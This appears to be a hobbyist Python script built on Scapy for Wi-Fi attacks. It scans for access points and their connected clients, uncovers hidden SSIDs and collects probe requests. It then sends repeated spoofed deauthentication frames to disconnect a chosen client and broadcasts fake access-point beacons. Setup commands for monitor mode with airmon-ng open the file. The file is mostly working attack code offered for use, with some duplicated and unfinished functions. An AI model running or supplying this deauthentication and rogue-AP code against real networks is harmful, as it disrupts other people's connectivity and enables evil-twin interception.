"""
https://www.thepythoncode.com/search?q=scapy
https://www.pentesteracademy.com/course?id=14
https://www.thepythoncode.com/article/create-fake-access-points-scapy

iwconfig
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
iwconfig
airodump-ng wlan0mon

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

"""
import sys
import socket
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
import pandas
from faker import Faker


devices = set()

ADDR = 0
BSSID = 1
CHANNEL = 2

target_mac = ""
ap_list = []
ssids_set = set()
client_list = []
network_adapter = sys.argv[1]
search_timeout = int(sys.argv[2])
packets = 100

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

stop_hopper = False


def packet_handler1(pkt):
    if pkt.haslayer(Dot11):
        dot11_layer = pkt.getlayer(Dot11)

        if dot11_layer.addr2 and dot11_layer.addr2 not in devices:
            devices.add(dot11_layer.addr2)
            print(len(devices), dot11_layer.addr2, dot11_layer.payload.name)

    else:
        print("Not an 802.11 packet")


def packet_handler2(pkt):
    if pkt.haslayer(Dot11):
        if pkt.addr2 and pkt.addr2 not in devices:
            devices.add(pkt.addr2)
            print(len(devices), pkt.addr2)

    else:
        print("Not an 802.11 packet")


ssids = set()


def packet_handler3(pkt):
    # Beacon frame contain the data we nee
    if pkt.haslayer(Dot11Beacon):
        if pkt.info and pkt.info not in ssids:
            ssids.add(pkt.info)
            print(len(ssids), pkt.addr3, pkt.info)


def packet_handler4(pkt):
    """
    find ssid
    :param pkt:
    :return:
    """
    # Beacon frame contain the data we need
    if pkt.haslayer(Dot11Beacon):

        # go to the layer with the needed data
        tmp = pkt
        while tmp:
            tmp = tmp.getlayer(Dot11Elt)
            # tmp.ID == 0 is the first step??
            if tmp and tmp.ID == 0 and tmp.info not in ssids:
                ssids.add(tmp.info)
                print(len(ssids), pkt.addr3, tmp.info)
                break  # one Dot11Elt is enough for as

            tmp = tmp.payload


client_probes = set()


def packet_handler5(pkt):
    """
    client probs
    :param pkt:
    :return:
    """

    if pkt.haslayer(Dot11ProbeReq):
        if len(pkt.info) > 0:
            new_client = (pkt.addr2, pkt.info)
            if new_client not in client_probes:
                client_probes.add(new_client)
                print("New client - addr2: %s info: %s " % (pkt.addr2, pkt.info))
                print("\n----------- Client Probes Table ---------------------\n")
                idx = 1
                for probe in client_probes:
                    print(idx, probe[ADDR], probe[BSSID].decode())
                    idx += 1
                print("\n-----------------------------------------------------\n")


def packet_handler5(pkt):
    """
    client probs
    :param pkt:
    :return:
    """

    if pkt.haslayer(Dot11ProbeReq):
        if len(pkt.info) > 0:
            new_client = (pkt.addr2, pkt.info)
            if new_client not in client_probes:
                client_probes.add(new_client)
                print("New client - addr2: %s info: %s " % (pkt.addr2, pkt.info))
                print("\n----------- Client Probes Table ---------------------\n")
                idx = 1
                for probe in client_probes:
                    print(idx, probe[ADDR], probe[BSSID].decode())
                    idx += 1
                print("\n-------------------------------------------------\n")


hidden_ssid_aps = set()


def packet_handler6(pkt):
    if pkt.haslayer(Dot11Beacon):
        if not pkt.info:
            if pkt.addr3 not in hidden_ssid_aps:
                print(hidden_ssid_aps.add(pkt.addr3))
                print("HIDDEN SSID network found! BSSID: ", pkt.addr3)
    elif pkt.haslayer(Dot11ProbeReq) and pkt.addr3 in hidden_ssid_aps:
        print("Hidden ssid uncovred! : ", pkt.info, pkt.addr3)


# print("welcome to uncover hidden ssids")
# print("-------------------------\n")
# sniff(iface=sys.argv[1], count=int(sys.argv[2]), prn=packet_handler6)


def scan_netwroks(pkt):
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = pkt[Dot11].addr2
        # get the name of it
        ssid = pkt[Dot11Elt].info.decode()


        if ssid not in ssids_set:
            ssids_set.add(ssid)

            stats = pkt[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")

            ap_list.append([ssid, bssid, channel])
            print("AP: %s SSID: %s Channel: %d" % (bssid, ssid, channel))




    #     try:
    #         dbm_signal = packet.dBm_AntSignal
    #     except:
    #         dbm_signal = "N/A"
    #     # extract network stats
    #     stats = packet[Dot11Beacon].network_stats()
    #     # get the channel of the AP
    #     channel = stats.get("channel")
    #     # get the crypto
    #     crypto = stats.get("crypto")
    #     networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
    #
    # if pkt.haslayer(Dot11Beacon):
    # type=0:  indicates that it is a management frame.
    # subtype=8:  indicates that this management frame is a beacon frame.
    #     # if pkt.type == 0 and pkt.subtype == 8:
    #     # if pkt.haslayer(Dot11Beacon) :
    #         if [pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))] not in ap_list:
    #             ap_list.append([pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))])
    #             print("AP: %s SSID: %s Channel: %d" % (pkt.addr2, pkt.info.decode(), int(ord(pkt[Dot11Elt:3].info))))
    #

def set_channel(channel):
    os.system('iwconfig %s channel %d' % (network_adapter, channel))


def attack(client_idx):
    print("attacking")
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC

    client_mac = client_list[client_idx]
    print("attaching client mac:", client_mac)
    # print("clinet mac to attack:", client_mac )
    # brdmac = "ff:ff:ff:ff:ff:ff"
    # pkt = RadioTap() / Dot11(addr1 = brdmac , addr2 = client_mac , addr3 = client_mac)/ Dot11Deauth()
    # sendp(pkt, iface=network_adapter , count=1000, inter = 0.2)

    for y in range(1,2):
        pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
        pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
        for _ in range(100):
            print("sendppp" )
            sendp(pkt1, iface=network_adapter )
            sendp(pkt2, iface=network_adapter )
            if y % 30 == 0:
                press = input("press p to stop, otherwise any")
                if press == 'p':
                    print("#  Goodbye  #")
                    break
    fake_AP(client_mac)






def scan_clients(rmac, addr):
    global target_mac
    target_mac = rmac
    time = search_timeout * 2
    print("\nscanning clinet's mac:" ,rmac, "\tessid:" , addr ,  "\nscanning time:", time, "sec\n\nscanning...\n")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    sniff(iface=network_adapter, prn=only_clients, timeout=time)
    print("\n----------- Clientsr Table ---------------------\n")
    for x in range(len(client_list)):
        print('[',x ,']', client_list[x])
    print("\n-----------------------------------------\n")
    result = input("Choose number to attack or type 'r' for rescan: ")
    if result == 'r':
        scan_clients(rmac , addr)
    elif result == 'q':
        return
    elif result.isnumeric():
        attack(int(result))
    else:
        return




def only_clients(pkt):
    global client_list
    if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client mac:", pkt.addr1)

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {network_adapter} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def showAPs():
    print("welcome to Show APs")
    print("-------------------------\n")
    print("\nnetwork scanning time:" , search_timeout, "sec\nscanning...\n")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("incoming APs:")
    print("--------------------------")
    sniff(iface=network_adapter, prn=scan_netwroks, timeout=search_timeout)
    num = len(ap_list)
    if num > 0: # has available networks
        print("\n----------- AP's Table ---------------------\n")
        for x in range(num):
            # print(x, ap_list[x][BSSID].decode(), ap_list[x][ADDR])
            print('[', x , ']', ap_list[x][BSSID], ap_list[x][ADDR])
        print("\n-----------------------------------------------------\n")

        result = int(input("Choose number to attack: "))
        # stop_hopper = True
        print("ch:", int(ap_list[result][CHANNEL]), end='\t')
        print("bssid:", ap_list[result][BSSID])
        set_channel(int(ap_list[result][CHANNEL]))
        scan_clients(ap_list[result][BSSID] , ap_list[result][ADDR])
    else: # didn't found
        rescan = input("----- Do you want to rescan ? y/n -----")
        if rescan == "y":
            showAPs()
        else:
            print("#  Goodbye  #")


def send_beacon(ssid, mac, client_mac ,infinite=True):
    # N: 30: 52:cb: ca:77: d8
    # Y:
    dot11 = Dot11(type=0, subtype=8,
                  addr1=client_mac,
                  addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, loop=1, iface=network_adapter, verbose=0)
    print("fake AP data sent")



def fake_AP(client_mac) :
    print("start fake AP")
    # number of access points
    n_ap = 1
    iface = "wlan0mon"
    # generate random SSIDs and MACs
    faker = Faker()
    ssids_macs = [("TEST123", faker.mac_address()) for i in range(n_ap)]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac, client_mac)).start()


def pick_action_type():
    action_type = input("press 1 for death attack\npress 2 for fake AP:\n")
    print()
    if action_type == '1':
        showAPs()
    elif action_type == '2':
        # fake_AP()
        pass
    else:
        pick_action_type()



if __name__ == "__main__":
    pick_action_type()
